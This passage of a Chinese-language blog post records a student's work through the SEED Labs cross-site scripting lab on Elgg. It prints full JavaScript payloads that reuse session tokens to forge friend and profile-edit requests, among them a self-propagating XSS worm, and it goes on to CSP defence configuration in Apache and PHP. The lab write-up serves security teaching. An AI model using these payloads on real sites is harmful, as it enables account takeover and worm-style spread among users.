+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">        <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/friends/add?friend=59&quot;</span> +</span><br><span class="line">            ts + token;</span><br><span class="line">        </span><br><span class="line">        <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">        <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">        <span class="title class_">Ajax</span>.<span class="title function_">send</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Questions"><a href="#Questions" class="headerlink" title="Questions."></a>Questions.</h3><blockquote>
+<p>Question 1: Explain the purpose of Lines ➀ and ➁, why are they are needed?</p>
+</blockquote>
+<p>ts 和 token 用来验证用户身份，获取它们形成完整的 GET 请求，达到欺骗服务器的目的。</p>
+<blockquote>
+<p>Question 2: If the Elgg application only provide the Editor mode for the “About Me” field, i.e.,you cannot switch to the Text mode, can you still launch a successful attack?</p>
+</blockquote>
+<p>此时在 description 处无法实施攻击。但可以压行后填写在 brief-description 处。</p>
+<h2 id="3-6-Task-5-Modifying-the-Victim’s-Profile"><a href="#3-6-Task-5-Modifying-the-Victim’s-Profile" class="headerlink" title="3.6 Task 5: Modifying the Victim’s Profile"></a>3.6 Task 5: Modifying the Victim’s Profile</h2><p>写一个xss worm，修改他人的profile<br>和前面类似，先获得正确修改profile的请求地址：<a target="_blank" rel="noopener" href="http://www.seed-server.com/action/profile/edit">http://www.seed-server.com/action/profile/edit</a></p>
+<p>和之前一样，修改Samy的”About Me”</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> userName=<span class="string">&quot;&amp;name=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span class="line">        <span class="keyword">var</span> guid=<span class="string">&quot;&amp;guid=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">        <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">        <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> content=token + ts + userName +</span><br><span class="line">            <span class="string">&quot;&amp;description=samy%20is%20my%20hero&amp;accesslevel[description]=2&quot;</span> +</span><br><span class="line">            guid;</span><br><span class="line">        <span class="keyword">var</span> samyGuid=<span class="number">59</span>;</span><br><span class="line">        <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>!=samyGuid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line">            <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,</span><br><span class="line">                                  <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h3><p>Question 3: Why do we need Line ➀? Remove this line, and repeat your attack. Report and explain your observation.</p>
+<p>这行用来判断当前用户是不是攻击者自身，如果是，就不进行攻击。如果去掉这行代码，会导致攻击者保存自己的 profile 后，description 立即被改变，无法实施攻击。</p>
+<h2 id="3-7-Task-6-Writing-a-Self-Propagating-XSS-Worm"><a href="#3-7-Task-6-Writing-a-Self-Propagating-XSS-Worm" class="headerlink" title="3.7 Task 6: Writing a Self-Propagating XSS Worm"></a>3.7 Task 6: Writing a Self-Propagating XSS Worm</h2><p>自我繁殖</p>
+<p>当其他人访问了samy的profile，不仅访问者被修改，访问者也会附带该蠕虫。使得后续访问这些访问者的人的profile也被修改（并附带蠕虫）</p>
+<h3 id="Link-Approach"><a href="#Link-Approach" class="headerlink" title="Link Approach"></a>Link Approach</h3><h3 id="DOM-Approach"><a href="#DOM-Approach" class="headerlink" title="DOM Approach"></a>DOM Approach</h3><p>编辑 Samy 的 profile，使其可以把自己赋值到别人的 profile 中</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script id=<span class="string">&quot;worm&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> headerTag = <span class="string">&quot;&lt;script id=\&quot;worm\&quot; type=\&quot;text/javascript\&quot;&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> jsCode = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;worm&quot;</span>).<span class="property">innerHTML</span>;</span><br><span class="line">    <span class="keyword">var</span> tailTag = <span class="string">&quot;&lt;/&quot;</span> + <span class="string">&quot;script&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> wormCode = <span class="built_in">encodeURIComponent</span>(headerTag + jsCode + tailTag);</span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> userName=<span class="string">&quot;&amp;name=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">name</span>;</span><br><span class="line">        <span class="keyword">var</span> guid=<span class="string">&quot;&amp;guid=&quot;</span>+elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>;</span><br><span class="line">        <span class="keyword">var</span> ts=<span class="string">&quot;&amp;__elgg_ts=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_ts</span>;</span><br><span class="line">        <span class="keyword">var</span> token=<span class="string">&quot;&amp;__elgg_token=&quot;</span>+elgg.<span class="property">security</span>.<span class="property">token</span>.<span class="property">__elgg_token</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> content=token + ts + userName +</span><br><span class="line">            <span class="string">&quot;&amp;description=&quot;</span> + wormCode + <span class="string">&quot;&amp;accesslevel[description]=2&quot;</span> + </span><br><span class="line">            <span class="string">&quot;&amp;briefdescription=samy%20is%20my%20hero&amp;accesslevel[briefdescription]=2&quot;</span> +</span><br><span class="line">            guid;</span><br><span class="line">        <span class="keyword">var</span> samyGuid=<span class="number">59</span>;</span><br><span class="line">        <span class="keyword">var</span> sendurl=<span class="string">&quot;http://www.seed-server.com/action/profile/edit&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(elgg.<span class="property">session</span>.<span class="property">user</span>.<span class="property">guid</span>!=samyGuid)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="title class_">Ajax</span>=<span class="literal">null</span>;</span><br><span class="line">            <span class="title class_">Ajax</span>=<span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">open</span>(<span class="string">&quot;POST&quot;</span>, sendurl, <span class="literal">true</span>);</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">setRequestHeader</span>(<span class="string">&quot;Content-Type&quot;</span>,</span><br><span class="line">                                  <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>);</span><br><span class="line">            <span class="title class_">Ajax</span>.<span class="title function_">send</span>(content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>alice登录，退出<br>charlie | seedcharlie登录，访问alice，然后自己的about me也改了</p>
+<h1 id="4-Task-7-Defeating-XSS-Attacks-Using-CSP"><a href="#4-Task-7-Defeating-XSS-Attacks-Using-CSP" class="headerlink" title="4 Task 7: Defeating XSS Attacks Using CSP"></a>4 Task 7: Defeating XSS Attacks Using CSP</h1><p>下面开始实验防御 XSS 攻击</p>
+<p>XSS 攻击的问题在于，html允许js代码和数据放在一个位置，没有进行辨析。</p>
+<p>解决方案：将代码和数据分离开来</p>
+<p>两种方式引入js:<br>inline approach: 代码直接写在页面里<br>link approach: 代码写在外部文件，连接到内部</p>
+<p>inline approach是引入XSS攻击的culprit(罪魁祸首)</p>
+<p>因为这让浏览器无法分辨代码来自何处：是网站本身的代码，还是攻击者引入的代码。</p>
+<p>link approach则告诉了浏览器，代码从何处来，浏览器可以选择是否信任。攻击者可以使用link approach的方式尝试攻击，但浏览器不会信任那些来源。</p>
+<p>使用Content Security Policy(CSP) 技术可以让网站告诉浏览器，哪些来源是可信的。</p>
+<p>CSP除了可以防御XSS攻击，还可以防御Click-Jacking 攻击</p>
+<h2 id="4-1-Experiment-Website-setup"><a href="#4-1-Experiment-Website-setup" class="headerlink" title="4.1 Experiment Website setup"></a>4.1 Experiment Website setup</h2><p><strong>Changing the configuration file.</strong></p>
+<p><strong>DNS Setup</strong></p>
+<p>确保&#x2F;etc&#x2F;hosts有以下内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">10.9.0.5 www.example32a.com</span><br><span class="line">10.9.0.5 www.example32b.com</span><br><span class="line">10.9.0.5 www.example32c.com</span><br><span class="line">10.9.0.5 www.example60.com</span><br><span class="line">10.9.0.5 www.example70.com</span><br></pre></td></tr></table></figure>
+
+<h2 id="4-2-The-web-page-for-the-experiment"><a href="#4-2-The-web-page-for-the-experiment" class="headerlink" title="4.2 The web page for the experiment"></a>4.2 The web page for the experiment</h2><h2 id="4-3-Setting-CSP-Policies"><a href="#4-3-Setting-CSP-Policies" class="headerlink" title="4.3 Setting CSP Policies"></a>4.3 Setting CSP Policies</h2><p>CSP is set by the web server as an HTTP header. There are two typical ways to set the header, by the web server (such as Apache) or by the web application. In this experiment, we will conduct experiments using both approaches.</p>
+<h3 id="CSP-configuration-by-Apache"><a href="#CSP-configuration-by-Apache" class="headerlink" title="CSP configuration by Apache."></a>CSP configuration by Apache.</h3><p>we set up three websites, but only the second one sets CSP policies<br>(the lines marked by ■)</p>
+<p>With this setup, when we visit example32b, Apache will add the specified CSP<br>header to all the response from this site.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># Purpose: Do not set CSP policies</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">DocumentRoot /var/www/csp</span><br><span class="line">ServerName www.example32a.com</span><br><span class="line">DirectoryIndex index.html</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"># Purpose: Setting CSP policies in Apache configuration</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">DocumentRoot /var/www/csp</span><br><span class="line">ServerName www.example32b.com</span><br><span class="line">DirectoryIndex index.html</span><br><span class="line">Header set Content-Security-Policy &quot; \ ■</span><br><span class="line">default-src ’self’; \ ■</span><br><span class="line">script-src ’self’ *.example70.com \ ■</span><br><span class="line">&quot;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br><span class="line"># Purpose: Setting CSP policies in web applications</span><br><span class="line">&lt;VirtualHost *:80&gt; ●</span><br><span class="line">DocumentRoot /var/www/csp</span><br><span class="line">ServerName www.example32c.com</span><br><span class="line">DirectoryIndex phpindex.php</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="CSP-configuration-by-web-applications"><a href="#CSP-configuration-by-web-applications" class="headerlink" title="CSP configuration by web applications."></a>CSP configuration by web applications.</h3><p>phpindex.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cspheader</span> = <span class="string">&quot;Content-Security-Policy:&quot;</span>.</span><br><span class="line"><span class="string">&quot;default-src ’self’;&quot;</span>.</span><br><span class="line"><span class="string">&quot;script-src ’self’ ’nonce-111-111-111’ *.example70.com&quot;</span>.</span><br><span class="line"><span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="variable">$cspheader</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> ’index.html’;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="4-4-Lab-tasks"><a href="#4-4-Lab-tasks" class="headerlink" title="4.4 Lab tasks"></a>4.4 Lab tasks</h2><p>visit the following URLs from your VM.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://www.example32a.com</span><br><span class="line">http://www.example32b.com</span><br><span class="line">http://www.example32c.com</span><br></pre></td></tr></table></figure>
+
+
+<blockquote>
+<ol>
+<li>Describe and explain your observations when you visit these websites.</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="2">
+<li>Click the button in the web pages from all the three websites, describe and explain your observations.</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="3">
+<li>Change the server configuration on example32b (modify the Apache configuration), so Areas 5 and 6 display OK. Please include your modified configuration in the lab report.</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="4">
+<li>Change the server configuration on example32c (modify the PHP code), so Areas 1, 2, 4, 5, and 6 all display OK. Please include your modified configuration in the lab report.</li>
+</ol>
+</blockquote>
+<blockquote>
+<ol start="5">
+<li>Please explain why CSP can help prevent Cross-Site Scripting attacks.</li>
+</ol>
+</blockquote>
+<h3 id="Q1-Q2：访问三个网址，结果如下"><a href="#Q1-Q2：访问三个网址，结果如下" class="headerlink" title="Q1 &amp;&amp; Q2：访问三个网址，结果如下"></a>Q1 &amp;&amp; Q2：访问三个网址，结果如下</h3><p>（只有a的click有反应，b，c的按钮点击没反应）</p>
+<h3 id="Q3-修改-apache-csp-conf"><a href="#Q3-修改-apache-csp-conf" class="headerlink" title="Q3 修改 apache_csp.conf"></a>Q3 修改 apache_csp.conf</h3><p><a target="_blank" rel="noopener" href="http://www.example32b.com/">www.example32b.com</a> 的那段配置改成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">## Purpose: Setting CSP policies in Apache configuration</span><br><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line">    DocumentRoot /var/www/csp</span><br><span class="line">    ServerName www.example32b.com</span><br><span class="line">    DirectoryIndex index.html</span><br><span class="line">    Header set Content-Security-Policy &quot; \</span><br><span class="line">            default-src &#x27;self&#x27;; \</span><br><span class="line">            script-src &#x27;self&#x27; *.example60.com \</span><br><span class="line">            script-src &#x27;self&#x27; *.example70.com \</span><br><span class="line">        &quot;</span><br><span class="line">&lt;/VirtualHost&gt;</span><br></pre></td></tr></table></figure>
+
+<p>修改完后，需要rebuild the image and restart the container</p>
+<p>为方便起见，可以直接进入虚拟机进行修改</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[11/29/24]seed@VM:~/.../image_www$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                 NAMES</span><br><span class="line">27581e0aaf54        seed-image-www      &quot;/bin/sh -c &#x27;service…&quot;   32 hours ago        Up 13 minutes                             elgg-10.9.0.5</span><br><span class="line">f9bad1bc28e1        seed-image-mysql    &quot;docker-entrypoint.s…&quot;   32 hours ago        Up 13 minutes       3306/tcp, 33060/tcp   mysql-10.9.0.6</span><br><span class="line">[11/29/24]seed@VM:~/.../image_www$ docker exec -it 27581e0aaf54 /bin/bash</span><br><span class="line">root@27581e0aaf54:/#</span><br></pre></td></tr></table></figure>
+
+<p>根据Dockerfile中的信息,修改&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;apache_csp.conf</p>
+<p>nano:^O保存，^X退出</p>
+<p>(容器内) service apache2 restart</p>
+<p>example32b.com 的 4、5、6 变成了 OK</p>
+<p>结果如下</p>
+<h3 id="Q4-修改-apache-csp-conf"><a href="#Q4-修改-apache-csp-conf" class="headerlink" title="Q4 修改 apache_csp.conf"></a>Q4 修改 apache_csp.conf</h3><p>修改 phpindex.php</p>
+<p>&#x2F;var&#x2F;www&#x2F;csp&#x2F;phpindex.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$cspheader</span> = <span class="string">&quot;Content-Security-Policy:&quot;</span>.</span><br><span class="line">                 <span class="string">&quot;default-src &#x27;self&#x27;;&quot;</span>.</span><br><span class="line">                 <span class="string">&quot;script-src &#x27;self&#x27; &#x27;nonce-111-111-111&#x27; &#x27;nonce-222-222-222&#x27; *.example60.com *.example70.com&quot;</span>.</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="variable">$cspheader</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">include</span> <span class="string">&#x27;index.html&#x27;</span>;<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>service apache2 restart</p>
+<p>结果，c全部变成OK</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://jinglong-liu.github.io">liujinglong</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://jinglong-liu.github.io/2024/11/25/Seed-Web-Security-Labs-XSS/">https://jinglong-liu.github.io/2024/11/25/Seed-Web-Security-Labs-XSS/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://jinglong-liu.github.io" target="_blank">Hexo</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/11/25/adb-lab-buffer/" title="我在科软学真东西之-高级数据库技术-lab-buffer"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">我在科软学真东西之-高级数据库技术-lab-buffer</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/10/project-interview-bilibili/" title="项目面试准备：仿写Bilibili"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">项目面试准备：仿写Bilibili</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">liujinglong</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">15</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%EF%BC%9AXSS-%E6%94%BB%E5%87%BB%E7%AE%80%E8%A6%81%E8%AF%B4%E6%98%8E"><span class="toc-number">1.</span> <span class="toc-text">基础知识：XSS 攻击简要说明</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS%E5%88%86%E7%B1%BB"><span class="toc-number">1.2.</span> <span class="toc-text">XSS分类</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8BXSS-%E9%9D%9E%E6%8C%81%E4%B9%85%E5%9E%8BXSS"><span class="toc-number">1.2.1.</span> <span class="toc-text">反射型XSS(非持久型XSS)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%82%A8%E5%AD%98%E5%9E%8BXSS-%E6%8C%81%E4%B9%85%E5%9E%8BXSS"><span class="toc-number">1.2.2.</span> <span class="toc-text">储存型XSS(持久型XSS)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-%E9%98%B2%E8%8C%83"><span class="toc-number">1.3.</span> <span class="toc-text">XSS 防范</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4"><span class="toc-number">1.3.1.</span> <span class="toc-text">过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81"><span class="toc-number">1.3.2.</span> <span class="toc-text">编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-number">1.3.3.</span> <span class="toc-text">限制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E5%87%86%E5%A4%87"><span class="toc-number">2.</span> <span class="toc-text">实验准备</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1-DNS-Setup"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 DNS Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2-Container-Setup-and-Commands"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 Container Setup and Commands</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-3-Elgg-Web-Application"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 Elgg Web Application</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#git-ssh-key"><span class="toc-number">3.</span> <span class="toc-text">git ssh key</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-Lab-Tasks"><span class="toc-number">4.</span> <span class="toc-text">3 Lab Tasks</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#3-1-Preparation-Getting-Familiar-with-the-%E2%80%9CHTTP-Header-Live%E2%80%9D-tool"><span class="toc-number">4.1.</span> <span class="toc-text">3.1 Preparation: Getting Familiar with the “HTTP Header Live” tool</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-Task-1-Posting-a-Malicious%EF%BC%88%E6%81%B6%E6%84%8F%E7%9A%84%EF%BC%89-Message-to-Display-an-Alert-Window"><span class="toc-number">4.2.</span> <span class="toc-text">3.2 Task 1: Posting a Malicious（恶意的） Message to Display an Alert Window</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-3-Task-2-Posting-a-Malicious-Message-to-Display-Cookies"><span class="toc-number">4.3.</span> <span class="toc-text">3.3 Task 2: Posting a Malicious Message to Display Cookies</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-4-Task-3-Stealing-Cookies-from-the-Victim%E2%80%99s-Machine"><span class="toc-number">4.4.</span> <span class="toc-text">3.4 Task 3: Stealing Cookies from the Victim’s Machine</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-5-Task-4-Becoming-the-Victim%E2%80%99s-Friend"><span class="toc-number">4.5.</span> <span class="toc-text">3.5 Task 4: Becoming the Victim’s Friend</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Questions"><span class="toc-number">4.5.1.</span> <span class="toc-text">Questions.</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-6-Task-5-Modifying-the-Victim%E2%80%99s-Profile"><span class="toc-number">4.6.</span> <span class="toc-text">3.6 Task 5: Modifying the Victim’s Profile</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Question"><span class="toc-number">4.6.1.</span> <span 